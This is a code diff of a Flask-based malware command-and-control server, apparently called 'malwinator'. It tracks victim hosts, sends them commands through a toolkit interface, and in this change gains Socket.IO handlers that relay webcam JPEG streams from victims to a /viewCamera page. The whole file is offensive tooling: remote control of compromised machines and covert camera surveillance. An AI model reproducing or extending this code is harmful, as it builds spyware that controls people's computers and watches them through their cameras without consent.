@@ -1,9 +1,12 @@
-from flask import Flask, request, send_file, render_template, Response
+from flask import Flask, request, send_file, render_template
 import os, time
 import threading
+from flask_socketio import SocketIO
+import socket
+
 
 app = Flask(__name__)
-
+socketio = SocketIO(app)
 
 ''' The hosts dictonary form
   hosts [(ip, host_name)] = {
@@ -13,6 +16,7 @@ app = Flask(__name__)
   }
 '''
 hosts = {}
+
 
 def send_command(name, ip, command):
   global hosts
@@ -78,16 +82,6 @@ def timeout():
   
   # when the mutex is unlocked the command is sent to the host
   return hosts[key]['command'], 200
-
-# this is for the hacker interface
-# @app.route('/send', methods = ['GET'])
-# def send_form():
-#   global hosts
-
-#   name = request.args.get('name')
-#   ip = request.args.get('ip')
-  
-#   return render_template('form.html', name = name, ip = ip)
 
 # this is for the general interface where you can pick different tools to control one victim
 @app.route('/toolkit', methods = ['GET'])
@@ -210,15 +204,33 @@ def upload():
 
   return render_template('upload.html', name = name, ip = ip, files = file_list)
 
+# this is for the web sockets designed for camera access
+@socketio.on('connect')
+def handle_connect():
+    print('Client connected')
+
+@socketio.on('disconnect')
+def handle_disconnect():
+    print('Client disconnected')
+
+@socketio.on('stream')
+def handle_stream(data):
+    # Broadcast received JPEG data to all clients
+    socketio.emit('stream', data)
+
+@app.route('/viewCamera', methods=['GET'])
+def view_camera():
+  return render_template('camera.html', name=request.args.get('name'), ip=request.args.get('ip')) 
+
 
 # https server
-# if __name__ == '__main__':
-#   app.run(ssl_context=('/etc/letsencrypt/live/malwinator.chickenkiller.com/fullchain.pem', '/etc/letsencrypt/live/malwinator.chickenkiller.com/privkey.pem'), debug=False, host='0.0.0.0', port='8082')
+if __name__ == '__main__':
+  socketio.run(ssl_context=('/etc/letsencrypt/live/malwinator.chickenkiller.com/fullchain.pem', '/etc/letsencrypt/live/malwinator.chickenkiller.com/privkey.pem'), debug=False, host='0.0.0.0', port='8082')
 
 # http server
-if __name__ == "__main__":
-  app.run(host='0.0.0.0', port='5000')
+# if __name__ == "__main__":
+#   socketio.run(app, host='0.0.0.0', port='5000')
 
 # # localhost server
 # if __name__ == "__main__":
-#   app.run(host='127.0.0.1', port='8088')
+#   socketio.run(host='127.0.0.1', port='8088')
